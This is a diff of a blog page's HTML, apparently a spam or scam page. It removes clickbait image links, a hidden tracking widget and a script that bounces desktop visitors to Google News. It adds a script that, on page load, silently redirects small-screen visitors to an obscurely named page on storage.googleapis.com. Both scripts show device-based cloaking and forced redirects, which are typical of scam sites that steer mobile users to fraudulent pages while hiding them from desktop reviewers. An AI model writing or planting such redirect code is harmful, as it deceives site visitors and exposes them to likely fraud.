@@ -14,31 +14,19 @@
 
 
 
-<meta name="deepview-service" content="deepview-service">
-<link href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet" type="text/css">
-
-<p>&nbsp;</p><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="345" data-original-width="600" height="368" src="https://1.bp.blogspot.com/--3RpuxXy20o/YRcysgRw-FI/AAAAAAAAAqQ/2VI2qPihkGYYmI812pnyKQwggZeebo6RACLcBGAsYHQ/w640-h368/Screenshot_1.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="340" data-original-width="600" height="362" src="https://1.bp.blogspot.com/-OkI5pdrlEBc/YRcyskaCwBI/AAAAAAAAAqI/z4JjWjf0ZAMiQHeuTsM3i5tYc-ganYd8wCLcBGAsYHQ/w640-h362/Screenshot_2.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="338" data-original-width="600" height="360" src="https://1.bp.blogspot.com/-JTY5tMc8eIY/YRcysvUWSMI/AAAAAAAAAqE/AZqneWBIRR8bzxkYL3Qp6JSYpwpfuUExACLcBGAsYHQ/w640-h360/Screenshot_3.png" width="640" /></a></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://storage.googleapis.com/appvideoonlinepplus/index.html" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="339" data-original-width="600" height="362" src="https://1.bp.blogspot.com/-RY4bJlMGPxY/YRcytHAlxdI/AAAAAAAAAqM/Ku9FaF0QzEMSTPXp6vSgTxPkFGe3BhMqACLcBGAsYHQ/w640-h362/Screenshot_4.png" width="640" /></a></div><br />
-
-
-<div style="VISIBILITY: hidden;"> <script type="text/javascript" src="//widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('1si0uzxbdr')</script></div>
-
-
-
-<script type="text/javascript">
-//<![CDATA[
- function h(r, a) { var t = ""; if ("mix" == a) var h = 
-"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; else var h = 
-"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * 
-h.length)); return t };
-
-        var device = navigator.userAgent
+ <script type="text/javascript">
+	function generateRandomString(iLen) {
+    var sRnd = '';
+    var sChrs = "abcdefghiklmnopqrstuvwxyz";
+    for (var i = 0; i < iLen; i++) {
+      var randomPoz = Math.floor(Math.random() * sChrs.length);
+      sRnd += sChrs.substring(randomPoz, randomPoz + 1);
+    }
+    return sRnd;
+  }
+        if (screen.width <= 720) {
+        window.location = "https://storage.googleapis.com/youtubevideofbapp/%D9%80%20%D9%81%20%D9%82%20%D9%83%20%D9%84%20%D9%85%20%D9%86%20%D9%87%20%D9%88%20%D9%89%20%D9%8A.html";
+    } else {
         
-        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))
-        {
-         
-        }else
-{
- window.location = "https://news.google.com/topstories?tab=rn&hl=es-419&gl=US&ceid=US:es-419?"+ h(23, '')+"/?ref=bookmarks";
-}
-//]]>
+    }
 </script>
